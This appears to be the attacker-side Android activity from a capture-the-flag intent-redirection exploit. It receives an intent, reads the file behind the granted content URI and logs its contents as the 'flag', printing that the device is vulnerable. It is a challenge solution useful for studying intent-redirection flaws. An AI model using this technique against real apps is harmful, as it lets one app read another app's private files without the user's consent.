package com.test.chall_exploit;

import android.content.Context;
import android.app.Activity;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.util.Scanner;

public class TestActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.e("Receive", "Arbitrary intent executed. Device is vulnerable.");
        Intent intent = getIntent();
        String flag = null;
        try {
            ParcelFileDescriptor parcelFileDescriptor = getContentResolver().openFileDescriptor(intent.getData(), "r");
            FileReader reader = new FileReader(parcelFileDescriptor.getFileDescriptor());
            BufferedReader bufferedReader = new BufferedReader(reader);
            flag = new Scanner(bufferedReader).useDelimiter("\\A").next();//解析传来的数据
            Log.d("Receive", "flag: " + flag);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        }
    }
}
